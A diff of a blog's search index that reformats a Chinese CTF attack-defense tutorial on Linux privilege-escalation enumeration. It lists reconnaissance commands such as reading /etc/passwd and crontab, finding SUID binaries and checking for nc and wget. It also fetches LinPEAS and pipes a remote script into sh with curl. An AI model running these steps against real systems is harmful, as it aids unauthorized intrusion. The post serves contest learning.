@@ -875,7 +875,7 @@ The little girl was so happy that she had been able ...
       </tags>
   </entry>
   <entry>
-    <title>AWD 提权信息枚举</title>
+    <title>【AWD】Linux 提权 - 信息枚举</title>
     <url>/2023/11/11/AWD-%E6%8F%90%E6%9D%83%E4%BF%A1%E6%81%AF%E6%9E%9A%E4%B8%BE/</url>
     <content><![CDATA[<h1 id="【AWD】Linux-提权-信息枚举"><a href="#【AWD】Linux-提权-信息枚举" class="headerlink" title="【AWD】Linux 提权 - 信息枚举"></a>【AWD】Linux 提权 - 信息枚举</h1><p>大部分攻防场景, 在维持权限获取 shell 后, 很可能会分配到一个低权限用户, 提权到 root 级别的管理员用户才有 getshell 的意义.</p>
 <h2 id="权限体系"><a href="#权限体系" class="headerlink" title="权限体系"></a>权限体系</h2><h3 id="SUID-SGID"><a href="#SUID-SGID" class="headerlink" title="SUID SGID"></a>SUID SGID</h3><p><strong>SUID(Set User ID)</strong> 和 <strong>SGID(Set Group ID)</strong> 统称为 S 位, 被设置在可执行文件上, 当这些位被设置时，文件或程序将以文件所有者或组的权限运行，而不是以运行它的用户的权限运行。</p>
@@ -919,49 +919,41 @@ The little girl was so happy that she had been able ...
 
 <p>在获取反弹 shell 之前, 用 rlwrap 包裹起来, 这样就可以在终端中用方向键翻命令.</p>
 <h3 id="手动枚举"><a href="#手动枚举" class="headerlink" title="手动枚举"></a>手动枚举</h3><p>在这里列举的所有命令中, 第一条是主命令,大多情况适用</p>
-<p>查看当前权限</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">whoami # 查看自己的用户</span><br><span class="line">id    # 查看所有用户的权限信息</span><br><span class="line">who   # 当前登录的用户和相关信息, 可以看除了自己以外哪些用户登录了</span><br><span class="line">w     # 当前登录用户的详细信息</span><br><span class="line">last  # 显示系统最近的登录记录</span><br></pre></td></tr></table></figure>
+<h4 id="查看当前权限"><a href="#查看当前权限" class="headerlink" title="查看当前权限"></a>查看当前权限</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">whoami # 查看自己的用户</span><br><span class="line">id    # 查看所有用户的权限信息</span><br><span class="line">who   # 当前登录的用户和相关信息, 可以看除了自己以外哪些用户登录了</span><br><span class="line">w     # 当前登录用户的详细信息</span><br><span class="line">last  # 显示系统最近的登录记录</span><br></pre></td></tr></table></figure>
 
-<p>看内核版本</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">uname -a #查看当前内核版本</span><br><span class="line">lsb_release -a #查看更详细的信息</span><br><span class="line">cat /proc/version </span><br><span class="line">cat /etc/issue</span><br><span class="line">hostnamectl</span><br></pre></td></tr></table></figure>
+<h4 id="看内核版本"><a href="#看内核版本" class="headerlink" title="看内核版本"></a>看内核版本</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">uname -a #查看当前内核版本</span><br><span class="line">lsb_release -a #查看更详细的信息</span><br><span class="line">cat /proc/version </span><br><span class="line">cat /etc/issue</span><br><span class="line">hostnamectl</span><br></pre></td></tr></table></figure>
 
-<p>查看当前机器的 IP 地址 (横向渗透获取内网信息)</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">ip addr  # 最新最通用的方法</span><br><span class="line">ifconfig # 旧机器的查看 ip 方法</span><br><span class="line">ip route # 查看路由表</span><br><span class="line">ip neigh # 查看网络邻居</span><br><span class="line">arp -a   # 局域网中哪些 mac 地址和 ip 地址做了绑定</span><br></pre></td></tr></table></figure>
+<h4 id="查看当前机器的-IP-地址-横向渗透获取内网信息"><a href="#查看当前机器的-IP-地址-横向渗透获取内网信息" class="headerlink" title="查看当前机器的 IP 地址 (横向渗透获取内网信息)"></a>查看当前机器的 IP 地址 (横向渗透获取内网信息)</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">ip addr  # 最新最通用的方法</span><br><span class="line">ifconfig # 旧机器的查看 ip 方法</span><br><span class="line">ip route # 查看路由表</span><br><span class="line">ip neigh # 查看网络邻居</span><br><span class="line">arp -a   # 局域网中哪些 mac 地址和 ip 地址做了绑定</span><br></pre></td></tr></table></figure>
 
-<p>查看机器名称(用于定位角色来排除数据的优先级)</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">hostname # 看这个机器的名字</span><br><span class="line">hostnamectl #更详细一点</span><br></pre></td></tr></table></figure>
+<h4 id="查看机器名称-用于定位角色来排除数据的优先级"><a href="#查看机器名称-用于定位角色来排除数据的优先级" class="headerlink" title="查看机器名称(用于定位角色来排除数据的优先级)"></a>查看机器名称(用于定位角色来排除数据的优先级)</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">hostname # 看这个机器的名字</span><br><span class="line">hostnamectl #更详细一点</span><br></pre></td></tr></table></figure>
 
-<p>看当前用户有哪些以 <code>root</code> 的身份执行的</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+<h4 id="看当前用户有哪些以-root-的身份执行的"><a href="#看当前用户有哪些以-root-的身份执行的" class="headerlink" title="看当前用户有哪些以 root 的身份执行的"></a>看当前用户有哪些以 <code>root</code> 的身份执行的</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
 
-<p>查看权限体系</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">getcap -r / <span class="number">2</span>&gt;/dev/null # 用 -r 指定根目录, 错误信息扔掉</span><br></pre></td></tr></table></figure>
+<h4 id="查看权限体系"><a href="#查看权限体系" class="headerlink" title="查看权限体系"></a>查看权限体系</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">getcap -r / <span class="number">2</span>&gt;/dev/null # 用 -r 指定根目录, 错误信息扔掉</span><br></pre></td></tr></table></figure>
 
-<p>查看命令</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">ls -liah # 查看所有文件,包括隐藏文件</span><br><span class="line">ls -a    # 查看全部文件</span><br></pre></td></tr></table></figure>
+<h4 id="查看命令"><a href="#查看命令" class="headerlink" title="查看命令"></a>查看命令</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">ls -liah # 查看所有文件,包括隐藏文件</span><br><span class="line">ls -a    # 查看全部文件</span><br></pre></td></tr></table></figure>
 
-<p>查看 <code>passwd</code> 文件, 查看用户(名称:密码目录 + 描述 + bash 环境)</p>
+<h4 id="查看-passwd-文件"><a href="#查看-passwd-文件" class="headerlink" title="查看 passwd 文件"></a>查看 <code>passwd</code> 文件</h4><p>查看用户(名称:密码目录 + 描述 + bash 环境)</p>
 <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd # 获取用户描述(有 home 目录的就是活跃用户)+对应的 bash 环境</span><br></pre></td></tr></table></figure>
 
-<p>查看自动任务, 具体看是否有 root 权限的自动任务</p>
+<p>####查看自动任务</p>
+<p>具体看是否有 root 权限的自动任务</p>
 <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">cat /etc/crontab</span><br></pre></td></tr></table></figure>
 
-<p>查看环境变量</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> $<span class="built_in">PATH</span> # 查看路径</span><br><span class="line">env  # 看整体环境变了</span><br></pre></td></tr></table></figure>
+<h4 id="查看环境变量"><a href="#查看环境变量" class="headerlink" title="查看环境变量"></a>查看环境变量</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> $<span class="built_in">PATH</span> # 查看路径</span><br><span class="line">env  # 看整体环境变了</span><br></pre></td></tr></table></figure>
 
-<p>查看进程信息, 展示出来的列中, UID 是用户类型, PID 是进程号,<br>TTY 是终端类型, TIME 是进程使用的 cpu 时间, CMD 是进程正在运行的命令和可执行文件</p>
+<h4 id="查看进程信息"><a href="#查看进程信息" class="headerlink" title="查看进程信息"></a>查看进程信息</h4><p>展示出来的列中, UID 是用户类型, PID 是进程号,<br>TTY 是终端类型, TIME 是进程使用的 cpu 时间, CMD 是进程正在运行的命令和可执行文件</p>
 <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">ps -ef  # 通用</span><br><span class="line">ps axjf # a 查看所有进程, x 没有连接到终端的进程, j 显示进程数, f 输出格式</span><br><span class="line">ps <span class="built_in">aux</span>  # u 显示启动进程的用户</span><br><span class="line">top -n <span class="number">1</span> # top 是定时刷新进程的, 用 -n <span class="number">1</span> 让他只显示一次</span><br></pre></td></tr></table></figure>
 
-<p>查看网络统计, 可以看到占用端口的程序,和他的进程 id</p>
+<h4 id="查看网络统计"><a href="#查看网络统计" class="headerlink" title="查看网络统计"></a>查看网络统计</h4><p>可以看到占用端口的程序,和他的进程 id</p>
 <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">netstat -a # 查看所有</span><br><span class="line">netstat -au # 列出所有 TCP, UDP 连接的端口</span><br><span class="line">netstat -l # 列出监听的端口</span><br><span class="line">netstat -s # 统计网络使用的情况</span><br><span class="line">netstat -ano # n 不解析名称, o 显示计时器</span><br></pre></td></tr></table></figure>
 
-<p>查看有 S 位的可执行文件, 2&gt;&#x2F;dev&#x2F;null 把报错信息给扔掉</p>
+<h4 id="查看有-S-位的可执行文件"><a href="#查看有-S-位的可执行文件" class="headerlink" title="查看有 S 位的可执行文件"></a>查看有 S 位的可执行文件</h4><p> 2&gt;&#x2F;dev&#x2F;null 把报错信息给扔掉</p>
 <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm -u=s -<span class="built_in">type</span> f <span class="number">2</span>&gt;/dev/null</span><br></pre></td></tr></table></figure>
 
-<p>查看工具是否有安装</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">which 工具</span><br><span class="line">which awk perl python ruby gcc vi vim nmap <span class="built_in">find</span> nc wget tftp <span class="number">2</span>&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<h4 id="查看工具是否有安装"><a href="#查看工具是否有安装" class="headerlink" title="查看工具是否有安装"></a>查看工具是否有安装</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">which 工具</span><br><span class="line">which awk perl python ruby gcc vi vim nmap <span class="built_in">find</span> nc wget tftp <span class="number">2</span>&gt;/dev/null</span><br></pre></td></tr></table></figure>
 
-<p>查看哪些磁盘没被挂载, 运维人员做备份或者做系统快照时, 会用一个临时挂载的磁盘存取这些敏感信息.</p>
+<h4 id="查看哪些磁盘没被挂载"><a href="#查看哪些磁盘没被挂载" class="headerlink" title="查看哪些磁盘没被挂载"></a>查看哪些磁盘没被挂载</h4><p>运维人员做备份或者做系统快照时, 会用一个临时挂载的磁盘存取这些敏感信息.</p>
 <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">cat /etc/fstab</span><br></pre></td></tr></table></figure>
 
 <h3 id="自动化枚举"><a href="#自动化枚举" class="headerlink" title="自动化枚举"></a>自动化枚举</h3><p>先说说缺点:</p>
@@ -977,11 +969,9 @@ The little girl was so happy that she had been able ...
 </ol>
 <p>不同系统可能没安装对应的语言, 或者对特定语言的函数做了过滤, 要多换几个工具.</p>
 <p>以 LinPEASS 为例, 以下是操作方法:</p>
-<p>传统方法:</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp # 大多数在 tmp 目录下做</span><br><span class="line">wget https:.... # 搬运工具</span><br><span class="line">ls # 查看可执行文件</span><br><span class="line">chmod +x linpeas.sh # 赋予权限</span><br><span class="line">./linpeas.sh # 执行</span><br></pre></td></tr></table></figure>
+<h4 id="传统方法"><a href="#传统方法" class="headerlink" title="传统方法:"></a>传统方法:</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp # 大多数在 tmp 目录下做</span><br><span class="line">wget https:.... # 搬运工具</span><br><span class="line">ls # 查看可执行文件</span><br><span class="line">chmod +x linpeas.sh # 赋予权限</span><br><span class="line">./linpeas.sh # 执行</span><br></pre></td></tr></table></figure>
 
-<p>推荐方法(有 curl):</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">curl -L https:... | sh </span><br></pre></td></tr></table></figure>
+<h4 id="推荐方法-有-curl"><a href="#推荐方法-有-curl" class="headerlink" title="推荐方法(有 curl):"></a>推荐方法(有 curl):</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">curl -L https:... | sh </span><br></pre></td></tr></table></figure>
 
 <p>这里用 <code>-L</code> 追随重定向, 用 <code>|</code> 管道符连接到 <code>sh</code> 直接执行,就不会再本地存储.</p>
 <p>如果连不到外网, 就要先在自己的机子本地下载 sh 文件, 然后在启动监听, 再 curl 过去靶机.</p>
